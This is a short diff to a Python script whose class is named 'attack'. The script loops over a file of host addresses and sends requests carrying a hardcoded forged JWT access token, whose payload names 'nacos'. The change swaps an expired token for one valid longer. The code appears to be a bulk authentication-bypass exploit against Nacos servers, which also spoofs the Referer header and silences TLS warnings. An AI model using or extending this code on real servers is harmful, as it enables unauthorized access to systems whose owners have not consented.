@@ -40,7 +40,7 @@ class attack():
         for line in file:
             httpline = "http://" + line.strip()
             payload = {"pageNo": "1", "pageSize": "9",
-                       "accessToken": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg4NDcyN30.HZz-hcWTVEObpGuS0XYii0YYXkmLXo7cyP09IgZiBd0"}
+                       "accessToken": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxMDUwNDAxOX0.vW8mpBNoJ7hVKPNhEtQl4Z5b00G4P9Ktrn_7c58crOk"}
             headers = {"Referer": httpline}
             try:
                 urllib3.disable_warnings()
